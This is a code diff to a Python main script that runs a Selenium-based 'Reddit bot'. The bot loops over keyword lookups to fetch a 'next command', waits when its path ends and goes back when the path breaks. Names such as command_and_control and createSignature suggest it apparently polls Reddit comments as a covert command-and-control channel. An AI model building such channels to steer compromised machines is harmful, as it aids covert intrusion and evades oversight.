@@ -1,28 +1,34 @@
+import time
 import bot
-import command_and_control
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.common.by import By
+from selenium import webdriver
+
+
+PATH = r'chromedriver.exe'
 
 
 if __name__ == '__main__':
     # run the Reddit bot
     bootstap = ["harrypotter","art","water","lilly"]
     demo = bot.Bot(bootstap)
+    status, next_keys = demo.start()
+
     timeToSleep = 0
-    # status, next_keys = demo.GetNextCommand("harrypotter","art","water","lilly") #demo.start()
-    # print(f'status {status}, next keys {next_keys}')
+    while True:
+        if status == 1:  # found next keys
+            status, next_keys = demo.get_next_command(next_keys[0], next_keys[1], next_keys[2], next_keys[3])
 
+        if status == 2:  # next keys don't exist [end of path]
+            time.sleep(10 * 60)
+            status, next_keys = demo.get_next_command(next_keys[0], next_keys[1], next_keys[2], next_keys[3])
 
-    # while True:
-    #     if status == 1:  # found next keys
-    #         status, next_keys = demo.GetNextCommand(next_keys[0], next_keys[1], next_keys[2], next_keys[3])
-    #
-    #     if status == 2:  # next keys don't exist [end of path]
-    #         time.sleep(10 * 60)
-    #         status, next_keys = demo.GetNextCommand(next_keys[0], next_keys[1], next_keys[2], next_keys[3])
-    #
-    #     if status == 3:  # didn't find a comment with the given keys [path corrupted]
-    #         status, next_keys =  demo.GoBack()
-    #         print(status , next_keys)
-    #     time.sleep(timeToSleep)
+        if status == 3:  # didn't find a comment with the given keys [path corrupted]
+            status, next_keys =  demo.go_back()
+
+        time.sleep(timeToSleep)
 
 
 
@@ -34,7 +40,3 @@ if __name__ == '__main__':
 #     x = command_and_control.CommandAndControl()
 #     sig = x.createSignature(msg)
 #     print(sig)
-
-
-
-
